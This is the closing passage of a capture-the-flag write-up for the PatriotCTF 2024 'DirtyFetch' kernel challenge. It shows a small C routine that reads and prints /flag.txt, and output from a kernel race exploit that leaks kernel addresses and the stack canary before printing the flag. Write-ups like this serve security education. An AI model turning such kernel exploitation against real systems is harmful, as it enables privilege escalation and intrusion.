<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">safe_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/flag.txt"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">kernel leak      : 0xffffffff8bf5691f
kernel base      : 0xffffffff8bc00000
canary           : 0x978e4b06167e6800
Start allocating storage buffer
[   63.290889] Data copied!
...
[   63.293273] Data copied!
Start switching data length
[   63.293372] Data copied!
[   63.294151] Data copied!
[   63.294599] Specified size goes out of bounds.
[   63.294682] Error copying userspace data!
[   63.294948] Data copied!
...
[   63.497838] Specified size goes out of bounds.
[   63.497911] Error copying userspace data!
[   63.498172] Data copied!
[   63.498406] Data copied!
pctf{t1m3_2_k3rn3l_r4c3_eea6228cb8}
$�9�
[   63.502187] Data saved!
Segmentation fault
/ $ </code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=PatriotCTF 2024 - DirtyFetch&amp;url=https://kileak.github.io/ctf/2024/patriot24-dirty_fetch/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2024/patriot24-dirty_fetch/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2024/patriot24-dirty_fetch';
        var disqus_title = 'PatriotCTF 2024 - DirtyFetch';
        var disqus_url = 'https://kileak.github.io/ctf/2024/patriot24-dirty_fetch';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
